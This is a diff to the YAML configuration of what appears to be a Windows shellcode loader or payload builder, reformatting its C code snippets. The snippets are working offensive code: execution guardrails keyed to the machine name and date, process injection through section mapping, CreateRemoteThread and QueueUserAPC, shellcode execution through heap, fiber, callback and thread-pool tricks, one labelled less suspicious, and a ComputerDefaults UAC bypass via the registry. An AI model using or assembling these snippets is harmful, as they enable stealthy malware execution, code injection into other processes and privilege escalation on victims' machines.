+      // Guardrail: Environment variable must contain specific value
+      {
+          auto my_tolower = [](char c) -> char {
+              return (c >= 'A' && c <= 'Z') ? c + 32 : c;
+          };
+          
+          auto contains_ci = [&my_tolower](const char* haystack, const char* needle) -> bool {
+              if (!haystack || !needle) return false;
+              for (; *haystack; haystack++) {
+                  const char* h = haystack;
+                  const char* n = needle;
+                  while (*h && *n && my_tolower(*h) == my_tolower(*n)) { h++; n++; }
+                  if (*n == '\0') return true;
+              }
+              return false;
+          };
+          
+          char buffer[1024];
+          DWORD result = GetEnvironmentVariableA("COMPUTERNAME", buffer, 1024);
+          if (result == 0 || !contains_ci(buffer, "__GUARDRAIL_PARAM__")) {
+              return 0;
+          }
+      }
+
   - id: DomainCheck
     display: Domain Membership Check
     default: false
@@ -763,7 +1156,25 @@ sections:
   - id: DateRangeCheck
     display: Execution Date Range
     default: false
-    snippet: "// Guardrail: Only execute within date range\n{\n    SYSTEMTIME st;\n    GetLocalTime(&st);\n    \n    // Configure your date range (YYYY, MM, DD)\n    WORD startYear = 2024, startMonth = 1, startDay = 1;\n    WORD endYear = 2025, endMonth = 12, endDay = 31;\n    \n    DWORD current = (st.wYear * 10000) + (st.wMonth * 100) + st.wDay;\n    DWORD start = (startYear * 10000) + (startMonth * 100) + startDay;\n    DWORD end = (endYear * 10000) + (endMonth * 100) + endDay;\n    \n    if (current < start || current > end) {\n        return 0;\n    }\n}\n"
+    snippet: |
+      // Guardrail: Only execute within date range
+      {
+          SYSTEMTIME st;
+          GetLocalTime(&st);
+          
+          // Configure your date range (YYYY, MM, DD)
+          WORD startYear = 2024, startMonth = 1, startDay = 1;
+          WORD endYear = 2025, endMonth = 12, endDay = 31;
+          
+          DWORD current = (st.wYear * 10000) + (st.wMonth * 100) + st.wDay;
+          DWORD start = (startYear * 10000) + (startMonth * 100) + startDay;
+          DWORD end = (endYear * 10000) + (endMonth * 100) + endDay;
+          
+          if (current < start || current > end) {
+              return 0;
+          }
+      }
+
   - id: FileExistsCheck
     display: Required File Exists
     default: false
@@ -905,15 +1316,124 @@ sections:
   - id: MpfProcessInjectionViaProcessReflection
     display: Process Reflection Injection
     default: false
-    snippet: "// Process injection via NtCreateSection + NtMapViewOfSection\n{\n    typedef NTSTATUS (NTAPI *pNtCS)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);\n    typedef NTSTATUS (NTAPI *pNtMVOS)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);\n    HMODULE ntdll = GetModuleHandleA(\"ntdll.dll\");\n    pNtCS NtCS = (pNtCS)GetProcAddress(ntdll, \"NtCreateSection\");\n    pNtMVOS NtMVOS = (pNtMVOS)GetProcAddress(ntdll, \"NtMapViewOfSection\");\n    if (NtCS && NtMVOS) {\n        HANDLE hSection = NULL;\n        LARGE_INTEGER secSize = {0};\n        secSize.QuadPart = code_blob_len;\n        if (NtCS(&hSection, SECTION_ALL_ACCESS, NULL, &secSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) >= 0) {\n            PVOID localBase = NULL;\n            SIZE_T viewSize = 0;\n            NtMVOS(hSection, GetCurrentProcess(), &localBase, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);\n            if (localBase) {\n                memcpy(localBase, code_blob, code_blob_len);\n                PVOID remoteBase = NULL;\n                SIZE_T remoteSize = 0;\n                NtMVOS(hSection, GetCurrentProcess(), &remoteBase, 0, 0, NULL, &remoteSize, 2, 0, PAGE_EXECUTE_READ);\n                if (remoteBase) {\n                    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)remoteBase, NULL, 0, NULL);\n                    if (hThread) { WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); }\n                }\n            }\n            CloseHandle(hSection);\n        }\n    }\n}\n"
+    snippet: |
+      // Process injection via NtCreateSection + NtMapViewOfSection
+      {
+          typedef NTSTATUS (NTAPI *pNtCS)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+          typedef NTSTATUS (NTAPI *pNtMVOS)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
+          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+          pNtCS NtCS = (pNtCS)GetProcAddress(ntdll, "NtCreateSection");
+          pNtMVOS NtMVOS = (pNtMVOS)GetProcAddress(ntdll, "NtMapViewOfSection");
+          if (NtCS && NtMVOS) {
+              HANDLE hSection = NULL;
+              LARGE_INTEGER secSize = {0};
+              secSize.QuadPart = code_blob_len;
+              if (NtCS(&hSection, SECTION_ALL_ACCESS, NULL, &secSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) >= 0) {
+                  PVOID localBase = NULL;
+                  SIZE_T viewSize = 0;
+                  NtMVOS(hSection, GetCurrentProcess(), &localBase, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
+                  if (localBase) {
+                      memcpy(localBase, code_blob, code_blob_len);
+                      PVOID remoteBase = NULL;
+                      SIZE_T remoteSize = 0;
+                      NtMVOS(hSection, GetCurrentProcess(), &remoteBase, 0, 0, NULL, &remoteSize, 2, 0, PAGE_EXECUTE_READ);
+                      if (remoteBase) {
+                          HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)remoteBase, NULL, 0, NULL);
+                          if (hThread) { WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); }
+                      }
+                  }
+                  CloseHandle(hSection);
+              }
+          }
+      }
+
   - id: ClassicRemoteThread
     display: Classic Remote Thread Injection
     default: false
-    snippet: "// Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread\n{\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (hSnap != INVALID_HANDLE_VALUE) {\n        PROCESSENTRY32W pe32 = {sizeof(pe32)};\n        DWORD targetPid = 0;\n        if (Process32FirstW(hSnap, &pe32)) {\n            do {\n                if (_wcsicmp(pe32.szExeFile, L\"$psname$\") == 0) {\n                    targetPid = pe32.th32ProcessID;\n                    break;\n                }\n            } while (Process32NextW(hSnap, &pe32));\n        }\n        CloseHandle(hSnap);\n        \n        if (targetPid) {\n            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);\n            if (hProc) {\n                LPVOID remoteMem = VirtualAllocEx(hProc, NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n                if (remoteMem) {\n                    SIZE_T written;\n                    if (WriteProcessMemory(hProc, remoteMem, code_blob, code_blob_len, &written)) {\n                        HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);\n                        if (hThread) {\n                            WaitForSingleObject(hThread, INFINITE);\n                            CloseHandle(hThread);\n                        }\n                    }\n                }\n                CloseHandle(hProc);\n            }\n        }\n    }\n}\n"
+    snippet: |
+      // Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+      {
+          HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+          if (hSnap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe32 = {sizeof(pe32)};
+              DWORD targetPid = 0;
+              if (Process32FirstW(hSnap, &pe32)) {
+                  do {
+                      if (_wcsicmp(pe32.szExeFile, L"$psname$") == 0) {
+                          targetPid = pe32.th32ProcessID;
+                          break;
+                      }
+                  } while (Process32NextW(hSnap, &pe32));
+              }
+              CloseHandle(hSnap);
+              
+              if (targetPid) {
+                  HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+                  if (hProc) {
+                      LPVOID remoteMem = VirtualAllocEx(hProc, NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                      if (remoteMem) {
+                          SIZE_T written;
+                          if (WriteProcessMemory(hProc, remoteMem, code_blob, code_blob_len, &written)) {
+                              HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
+                              if (hThread) {
+                                  WaitForSingleObject(hThread, INFINITE);
+                                  CloseHandle(hThread);
+                              }
+                          }
+                      }
+                      CloseHandle(hProc);
+                  }
+              }
+          }
+      }
+
   - id: QueueUserAPC
     display: QueueUserAPC Injection
     default: false
-    snippet: "// QueueUserAPC injection into target process\n{\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);\n    if (hSnap != INVALID_HANDLE_VALUE) {\n        PROCESSENTRY32W pe32 = {sizeof(pe32)};\n        DWORD targetPid = 0;\n        if (Process32FirstW(hSnap, &pe32)) {\n            do {\n                if (_wcsicmp(pe32.szExeFile, L\"$psname$\") == 0) {\n                    targetPid = pe32.th32ProcessID;\n                    break;\n                }\n            } while (Process32NextW(hSnap, &pe32));\n        }\n        \n        if (targetPid) {\n            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);\n            if (hProc) {\n                LPVOID remoteMem = VirtualAllocEx(hProc, NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n                if (remoteMem) {\n                    SIZE_T written;\n                    if (WriteProcessMemory(hProc, remoteMem, code_blob, code_blob_len, &written)) {\n                        THREADENTRY32 te32 = {sizeof(te32)};\n                        if (Thread32First(hSnap, &te32)) {\n                            do {\n                                if (te32.th32OwnerProcessID == targetPid) {\n                                    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);\n                                    if (hThread) {\n                                        QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0);\n                                        CloseHandle(hThread);\n                                    }\n                                }\n                            } while (Thread32Next(hSnap, &te32));\n                        }\n                    }\n                }\n                CloseHandle(hProc);\n            }\n        }\n        CloseHandle(hSnap);\n    }\n}\n"
+    snippet: |
+      // QueueUserAPC injection into target process
+      {
+          HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
+          if (hSnap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe32 = {sizeof(pe32)};
+              DWORD targetPid = 0;
+              if (Process32FirstW(hSnap, &pe32)) {
+                  do {
+                      if (_wcsicmp(pe32.szExeFile, L"$psname$") == 0) {
+                          targetPid = pe32.th32ProcessID;
+                          break;
+                      }
+                  } while (Process32NextW(hSnap, &pe32));
+              }
+              
+              if (targetPid) {
+                  HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+                  if (hProc) {
+                      LPVOID remoteMem = VirtualAllocEx(hProc, NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                      if (remoteMem) {
+                          SIZE_T written;
+                          if (WriteProcessMemory(hProc, remoteMem, code_blob, code_blob_len, &written)) {
+                              THREADENTRY32 te32 = {sizeof(te32)};
+                              if (Thread32First(hSnap, &te32)) {
+                                  do {
+                                      if (te32.th32OwnerProcessID == targetPid) {
+                                          HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
+                                          if (hThread) {
+                                              QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0);
+                                              CloseHandle(hThread);
+                                          }
+                                      }
+                                  } while (Thread32Next(hSnap, &te32));
+                              }
+                          }
+                      }
+                      CloseHandle(hProc);
+                  }
+              }
+              CloseHandle(hSnap);
+          }
+      }
+
   inputs:
   - id: PsInjPsNameTextBox
     label: Target process name
@@ -930,35 +1450,205 @@ sections:
   - id: VirtualAllocExec
     display: VirtualAlloc + Function Pointer
     default: true
-    snippet: "// Execute via VirtualAlloc + function pointer\n{\n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {\n        VirtualFree(execMem, 0, MEM_RELEASE);\n        return -1;\n    }\n    \n    ((void(*)())execMem)();\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
+    snippet: |
+      // Execute via VirtualAlloc + function pointer
+      {
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {
+              VirtualFree(execMem, 0, MEM_RELEASE);
+              return -1;
+          }
+          
+          ((void(*)())execMem)();
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
   - id: HeapExec
     display: HeapAlloc + VirtualProtect
     default: false
-    snippet: "// Execute via HeapAlloc (less suspicious than VirtualAlloc)\n{\n    HANDLE hHeap = GetProcessHeap();\n    void* execMem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, code_blob_len);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {\n        HeapFree(hHeap, 0, execMem);\n        return -1;\n    }\n    \n    ((void(*)())execMem)();\n    \n    VirtualProtect(execMem, code_blob_len, oldProtect, &oldProtect);\n    HeapFree(hHeap, 0, execMem);\n}\n"
+    snippet: |
+      // Execute via HeapAlloc (less suspicious than VirtualAlloc)
+      {
+          HANDLE hHeap = GetProcessHeap();
+          void* execMem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, code_blob_len);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {
+              HeapFree(hHeap, 0, execMem);
+              return -1;
+          }
+          
+          ((void(*)())execMem)();
+          
+          VirtualProtect(execMem, code_blob_len, oldProtect, &oldProtect);
+          HeapFree(hHeap, 0, execMem);
+      }
+
   - id: CreateThread
     display: CreateThread Execution
     default: false
-    snippet: "// Execute via CreateThread\n{\n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);\n    \n    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);\n    if (hThread) {\n        WaitForSingleObject(hThread, INFINITE);\n        CloseHandle(hThread);\n    }\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
+    snippet: |
+      // Execute via CreateThread
+      {
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+          
+          HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
+          if (hThread) {
+              WaitForSingleObject(hThread, INFINITE);
+              CloseHandle(hThread);
+          }
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
   - id: NtCreateThreadEx
     display: NtCreateThreadEx (Direct Syscall)
     default: false
-    snippet: "// Execute via NtCreateThreadEx\n{\n    typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);\n    \n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);\n    \n    HMODULE ntdll = GetModuleHandleA(\"ntdll.dll\");\n    if (ntdll) {\n        pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, \"NtCreateThreadEx\");\n        if (NtCreateThreadEx) {\n            HANDLE hThread = NULL;\n            NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), \n                                               execMem, NULL, 0, 0, 0, 0, NULL);\n            if (hThread) {\n                WaitForSingleObject(hThread, INFINITE);\n                CloseHandle(hThread);\n            }\n        }\n    }\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
+    snippet: |
+      // Execute via NtCreateThreadEx
+      {
+          typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+          
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+          
+          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+          if (ntdll) {
+              pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
+              if (NtCreateThreadEx) {
+                  HANDLE hThread = NULL;
+                  NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), 
+                                                     execMem, NULL, 0, 0, 0, 0, NULL);
+                  if (hThread) {
+                      WaitForSingleObject(hThread, INFINITE);
+                      CloseHandle(hThread);
+                  }
+              }
+          }
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
   - id: FiberExec
     display: Fiber Execution
     default: false
-    snippet: "// Execute via Fibers\n{\n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);\n    \n    PVOID mainFiber = ConvertThreadToFiber(NULL);\n    if (mainFiber) {\n        PVOID shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);\n        if (shellcodeFiber) {\n            SwitchToFiber(shellcodeFiber);\n            DeleteFiber(shellcodeFiber);\n        }\n        ConvertFiberToThread();\n    }\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
+    snippet: |
+      // Execute via Fibers
+      {
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+          
+          PVOID mainFiber = ConvertThreadToFiber(NULL);
+          if (mainFiber) {
+              PVOID shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);
+              if (shellcodeFiber) {
+                  SwitchToFiber(shellcodeFiber);
+                  DeleteFiber(shellcodeFiber);
+              }
+              ConvertFiberToThread();
+          }
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
   - id: CallbackExec
     display: Callback Function Execution
     default: false
-    snippet: "// Execute via callback function (EnumWindows)\n{\n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);\n    \n    EnumWindows((WNDENUMPROC)execMem, 0);\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
+    snippet: |
+      // Execute via callback function (EnumWindows)
+      {
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+          
+          EnumWindows((WNDENUMPROC)execMem, 0);
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
   - id: ThreadPoolExec
     display: Thread Pool Execution
     default: false
-    snippet: "// Execute via Windows Thread Pool\n{\n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);\n    \n    PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)execMem, NULL, NULL);\n    if (work) {\n        SubmitThreadpoolWork(work);\n        WaitForThreadpoolWorkCallbacks(work, FALSE);\n        CloseThreadpoolWork(work);\n    }\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
+    snippet: |
+      // Execute via Windows Thread Pool
+      {
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+          
+          PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)execMem, NULL, NULL);
+          if (work) {
+              SubmitThreadpoolWork(work);
+              WaitForThreadpoolWorkCallbacks(work, FALSE);
+              CloseThreadpoolWork(work);
+          }
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
   - id: SecureExec
     display: Secure Execution with Full Cleanup
     default: false
-    snippet: "// Paranoid execution with memory zeroing\n{\n    static volatile BOOL g_SafeToRun = TRUE;\n    if (!g_SafeToRun) return 0;\n    \n    void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (!mem) return -1;\n    \n    // Copy and zero original\n    memcpy(mem, code_blob, code_blob_len);\n    SecureZeroMemory(code_blob, code_blob_len);\n    \n    DWORD old;\n    VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);\n    \n    // Final check before execution\n    if (!g_SafeToRun) { VirtualFree(mem, 0, MEM_RELEASE); return 0; }\n    \n    ((void(*)())mem)();\n    \n    // Cleanup\n    VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);\n    SecureZeroMemory(mem, code_blob_len);\n    VirtualFree(mem, 0, MEM_RELEASE);\n}\n"
+    snippet: |
+      // Paranoid execution with memory zeroing
+      {
+          static volatile BOOL g_SafeToRun = TRUE;
+          if (!g_SafeToRun) return 0;
+          
+          void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (!mem) return -1;
+          
+          // Copy and zero original
+          memcpy(mem, code_blob, code_blob_len);
+          SecureZeroMemory(code_blob, code_blob_len);
+          
+          DWORD old;
+          VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);
+          
+          // Final check before execution
+          if (!g_SafeToRun) { VirtualFree(mem, 0, MEM_RELEASE); return 0; }
+          
+          ((void(*)())mem)();
+          
+          // Cleanup
+          VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);
+          SecureZeroMemory(mem, code_blob_len);
+          VirtualFree(mem, 0, MEM_RELEASE);
+      }
+
   - id: RWtoRX
     display: RW Alloc → RX Protect
     default: false
@@ -978,7 +1668,27 @@ sections:
   - id: SyscallExec
     display: Direct Syscall Execution
     default: false
-    snippet: "// Execute via NtCreateThreadEx (direct syscall)\n{\n    typedef NTSTATUS (NTAPI *pNtCTE)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);\n    void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    memcpy(mem, code_blob, code_blob_len);\n    DWORD old;\n    VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);\n    \n    pNtCTE NtCTE = (pNtCTE)GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtCreateThreadEx\");\n    HANDLE hThread = NULL;\n    if (NtCTE) {\n        NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), mem, NULL, 0, 0, 0, 0, NULL);\n        if (hThread) {\n            WaitForSingleObject(hThread, INFINITE);\n            CloseHandle(hThread);\n        }\n    }\n    VirtualFree(mem, 0, MEM_RELEASE);\n}\n"
+    snippet: |
+      // Execute via NtCreateThreadEx (direct syscall)
+      {
+          typedef NTSTATUS (NTAPI *pNtCTE)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+          void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          memcpy(mem, code_blob, code_blob_len);
+          DWORD old;
+          VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);
+          
+          pNtCTE NtCTE = (pNtCTE)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateThreadEx");
+          HANDLE hThread = NULL;
+          if (NtCTE) {
+              NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), mem, NULL, 0, 0, 0, 0, NULL);
+              if (hThread) {
+                  WaitForSingleObject(hThread, INFINITE);
+                  CloseHandle(hThread);
+              }
+          }
+          VirtualFree(mem, 0, MEM_RELEASE);
+      }
+
   - id: DirectExec
     display: Direct Function Pointer
     default: false
@@ -1035,7 +1745,24 @@ sections:
   - id: ComputerDefaults
     display: ComputerDefaults Method
     default: false
-    snippet: "// UAC Bypass via ComputerDefaults\n{\n    HKEY hKey;\n    if (RegCreateKeyExW(HKEY_CURRENT_USER, L\"Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\", \n                        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {\n        const wchar_t* cmd = L\"cmd.exe\";\n        RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, (DWORD)((wcslen(cmd) + 1) * sizeof(wchar_t)));\n        RegSetValueExW(hKey, L\"DelegateExecute\", 0, REG_SZ, (BYTE*)L\"\", sizeof(wchar_t));\n        RegCloseKey(hKey);\n        \n        ShellExecuteW(NULL, L\"open\", L\"C:\\\\Windows\\\\System32\\\\ComputerDefaults.exe\", NULL, NULL, SW_HIDE);\n        Sleep(3000);\n        \n        RegDeleteTreeW(HKEY_CURRENT_USER, L\"Software\\\\Classes\\\\ms-settings\");\n    }\n}\n"
+    snippet: |
+      // UAC Bypass via ComputerDefaults
+      {
+          HKEY hKey;
+          if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", 
+                              0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+              const wchar_t* cmd = L"cmd.exe";
+              RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, (DWORD)((wcslen(cmd) + 1) * sizeof(wchar_t)));
+              RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
+              RegCloseKey(hKey);
+              
+              ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, SW_HIDE);
+              Sleep(3000);
+              
+              RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
+          }
+      }
+
 - header: Generic Payload
   template: genericshellcode
   display: Generic Payload
